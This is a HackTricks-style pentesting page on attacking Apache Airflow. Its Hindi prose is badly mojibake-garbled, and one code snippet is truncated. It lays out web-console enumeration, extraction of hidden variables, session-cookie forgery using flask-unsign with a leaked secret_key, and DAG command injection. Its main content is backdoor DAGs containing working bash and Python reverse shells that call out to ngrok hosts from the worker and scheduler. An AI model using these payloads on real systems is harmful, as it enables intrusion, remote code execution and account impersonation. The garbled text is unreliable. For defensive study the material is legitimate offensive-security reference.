# Apache Airflow рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

[**Apache Airflow**](https://airflow.apache.org) рдПрдХ рдордВрдЪ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЬреЛ **рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕ рдпрд╛ рд╡рд░реНрдХрдлреНрд▓реЛрдЬ рдХреЛ рдСрд░реНрдХреЗрд╕реНрдЯреНрд░реЗрдЯ рдФрд░ рд╢реЗрдбреНрдпреВрд▓ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд╣реИред рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ "рдСрд░реНрдХреЗрд╕реНрдЯреНрд░реЗрд╢рди" рд╢рдмреНрдж рдХрд╛ рдЕрд░реНрде рд╣реИ рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрддреЛрдВ рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЬрдЯрд┐рд▓ рдбреЗрдЯрд╛ рд╡рд░реНрдХрдлреНрд▓реЛрдЬ рдХреА рд╡реНрдпрд╡рд╕реНрдерд╛, рд╕рдордиреНрд╡рдп рдФрд░ рдкреНрд░рдмрдВрдзрди рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ред рдЗрди рдСрд░реНрдХреЗрд╕реНрдЯреНрд░реЗрдЯреЗрдб рдбреЗрдЯрд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕ рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдЙрджреНрджреЗрд╢реНрдп рдкреНрд░реЛрд╕реЗрд╕реНрдб рдФрд░ рдЙрдкрднреЛрдЧ рдпреЛрдЧреНрдп рдбреЗрдЯрд╛ рд╕реЗрдЯреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИред рдпреЗ рдбреЗрдЯрд╛ рд╕реЗрдЯреНрд╕ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЕрдиреЗрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ рд╡реНрдпрд╛рдкрд╛рд░ рдЦреБрдлрд┐рдпрд╛ рдЙрдкрдХрд░рдг, рдбреЗрдЯрд╛ рд╡рд┐рдЬреНрдЮрд╛рди рдФрд░ рдорд╢реАрди рд▓рд░реНрдирд┐рдВрдЧ рдореЙрдбрд▓ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рдЬреЛ рд╕рднреА рдмрд┐рдЧ рдбреЗрдЯрд╛ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рд▓рд┐рдП рдореМрд▓рд┐рдХ рд╣реИрдВред

рдореВрд▓ рд░реВрдк рд╕реЗ, Apache Airflow рдЖрдкрдХреЛ **рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд╢реЗрдбреНрдпреВрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬрдм рдХреБрдЫ** (рдЗрд╡реЗрдВрдЯ, рдХреНрд░реЙрди) **рд╣реЛрддрд╛ рд╣реИ**ред

## рд╕реНрдерд╛рдиреАрдп рд▓реИрдм

### Docker-Compose

рдЖрдк [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) рд╕реЗ **docker-compose рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ** рдкреВрд░реНрдг apache airflow docker рд╡рд╛рддрд╛рд╡рд░рдг рд▓реЙрдиреНрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред (рдпрджрд┐ рдЖрдк MacOS рдореЗрдВ рд╣реИрдВ рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдбреЙрдХрд░ VM рдХреЛ рдХрдо рд╕реЗ рдХрдо 6GB рд░реИрдо рджреЗрдВ)ред

### Minikube

**apache airflo**w рдХреЛ **minikube рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдиреЗ** рдХрд╛ рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow рд╡рд┐рдиреНрдпрд╛рд╕

Airflow рдЕрдкрдиреЗ рд╡рд┐рдиреНрдпрд╛рд╕ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЖрдкрдХреЛ рдХрдордЬреЛрд░ рд╡рд┐рдиреНрдпрд╛рд╕ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflow рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЖрдкрдХреЛ рд╕рдордЭрдирд╛ рдЪрд╛рд╣рд┐рдП **рдХреИрд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдХрд╛рдо рдХрд░рддреА рд╣реИрдВ**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## рд╣рдорд▓реЗ

### рд╡реЗрдм рдХрдВрд╕реЛрд▓ рдЧрдгрдирд╛

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдБрдЪ** рд╣реИ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рд╕реЗ рдХреБрдЫ рдпрд╛ рд╕рднреА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

* **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** (рдпрд╣рд╛рдБ рдХрд╕реНрдЯрдо рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* **рдХрдиреЗрдХреНрд╢рдиреНрд╕** (рдпрд╣рд╛рдБ рдХрд╕реНрдЯрдо рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)
* рдЗрдиреНрд╣реЗрдВ `http://<airflow>/connection/list/` рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ
* [**рд╡рд┐рдиреНрдпрд╛рд╕**](./#airflow-configuration) (рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ рдХрд┐ **`secret_key`** рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдпрд╣рд╛рдБ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ)
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рднреВрдорд┐рдХрд╛рдУрдВ** рдХреА рд╕реВрдЪреА
* рдкреНрд░рддреНрдпреЗрдХ **DAG** рдХрд╛ **рдХреЛрдб** (рдЬрд┐рд╕рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ)

### рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдорд╛рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛

рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ Airflow рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **DAGs** рдЙрдирдХреЗ рдорд╛рдиреЛрдВ рддрдХ **рдкрд╣реБрдБрдЪ** рд╕рдХреЗрдВред рдпрд╣ рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореНрд╕ рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЗ рд╕рдорд╛рди рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ GUI рдореЗрдВ `http://<airflow>/variable/list/` рдкрд░ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
Airflow рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ GUI рдореЗрдВ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рдорд╛рди рдХреЛ рджрд┐рдЦрд╛рдПрдЧрд╛, рд╣рд╛рд▓рд╛рдВрдХрд┐, [**рдЗрд╕**](https://marclamberti.com/blog/variables-with-apache-airflow/) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ **рд╕реВрдЪреА рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдХреЛ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬрд┐рдирдХрд╛ **рдорд╛рди** **GUI** рдореЗрдВ **рддрд╛рд░рд╛рдВрдХрди** рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ред

![](<../../.gitbook/assets/image (79).png>)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпреЗ **рдорд╛рди** рдЕрднреА рднреА **CLI** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкреНрд░рд╛рдкреНрдд** рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдкрдХреЛ DB рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП), **рдордирдорд╛рдиреЗ DAG** рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди, **API** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯ рддрдХ рдкрд╣реБрдБрдЪрддрд╛ рд╣реИ (API рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП), рдФрд░ **рдпрд╣рд╛рдБ рддрдХ рдХрд┐ GUI рд╕реНрд╡рдпрдВ рднреА!**\
GUI рд╕реЗ рдЙрди рдорд╛рдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╕ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ** рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдПрдХреНрд╕реЗрд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ **Actions -> Export рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ**ред\
рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ **рдЫрд┐рдкреЗ рд╣реБрдП рдорд╛рди** рдкрд░ **рдмреНрд░реВрдЯрдлреЛрд░реНрд╕** рдХрд░рдирд╛, **рдЦреЛрдЬ рдлрд┐рд▓реНрдЯрд░рд┐рдВрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдЬрдм рддрдХ рдЖрдк рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░ рд▓реЗрддреЗ:

![](<../../.gitbook/assets/image (30).png>)

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐

рдпрджрд┐ **`expose_config`** рд╡рд┐рдиреНрдпрд╛рд╕ **True** рдкрд░ рд╕реЗрдЯ рд╣реИ, рддреЛ **User рднреВрдорд┐рдХрд╛** рд╕реЗ **рдКрдкрд░** рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рд╡реЗрдм рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ, **`secret_key`** рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЗрд╕ рдорд╛рдиреНрдпрддрд╛ рд╡рд╛рд▓рд╛ рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдЕрдкрдиреА рд╕реНрд╡рдпрдВ рдХреА рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХреБрдХреА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG рдмреИрдХрдбреЛрд░ (Airflow worker рдореЗрдВ RCE)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **DAGs рд╕рд╣реЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдерд╛рди** рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░** рд╣реИ, рддреЛ рдЖрдк рдмрд╕ **рдПрдХ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдЖрдкрдХреЛ **рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓** рднреЗрдЬреЗрдЧрд╛ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ **airflow worker container** рдХреЗ рдЕрдВрджрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG рдмреИрдХрдбреЛрд░ (Airflow scheduler рдореЗрдВ RCE)

рдпрджрд┐ рдЖрдк рдХреБрдЫ рдРрд╕рд╛ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ **рдХреЛрдб рдХреЗ рд░реВрдЯ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИ**, рдЗрд╕ рд▓реЗрдЦрди рдХреЗ рд╕рдордп, рдпрд╣ **scheduler рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛** DAG рдХреЗ рдлреЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рд░рдЦрдиреЗ рдХреЗ рдХреБрдЫ рд╕реЗрдХрдВрдб рдмрд╛рджред
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG рдирд┐рд░реНрдорд╛рдг

рдпрджрд┐ рдЖрдк **DAG рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рдорд╢реАрди рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк `dags/` рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдирдП **DAGs рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗ **DAG рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдмрд╛рдХреА рдорд╢реАрдиреЛрдВ рдореЗрдВ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрди рдЬрд╛рдПрдВрдЧреЗ**ред

### DAG рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди

рдЬрдм рдЖрдк GUI рд╕реЗ рдХреЛрдИ DAG рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЙрд╕рдореЗрдВ **рдЖрд░реНрдЧреНрдпреБрдореЗрдВрдЯреНрд╕ рдкрд╛рд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ DAG рдареАрдХ рд╕реЗ рдХреЛрдбрд┐рдд рдирд╣реАрдВ рд╣реИ рддреЛ рд╡рд╣ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред**\
рдпрд╣реА рдЗрд╕ CVE рдореЗрдВ рд╣реБрдЖ рдерд╛: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

DAGs рдореЗрдВ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рддрд▓рд╛рд╢ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЬреЛ рдЬрд╛рдирдирд╛ рдЬрд░реВрд░реА рд╣реИ** рд╡рд╣ рдпрд╣ рд╣реИ рдХрд┐ **рдкреИрд░рд╛рдореАрдЯрд░реНрд╕** рдХреЛ **`dag_run.conf.get("param_name")`** рдХреЛрдб рдХреЗ рд╕рд╛рде **рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╡рд╣реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдХреЗ рд╕рд╛рде рднреА рд╣реЛ рд╕рдХрддреА рд╣реИ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк GUI рдореЗрдВ **рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рдореВрд▓реНрдп рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**). рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ **рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
```markdown
рдпрджрд┐ рд╡реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ bash рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрджрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
```
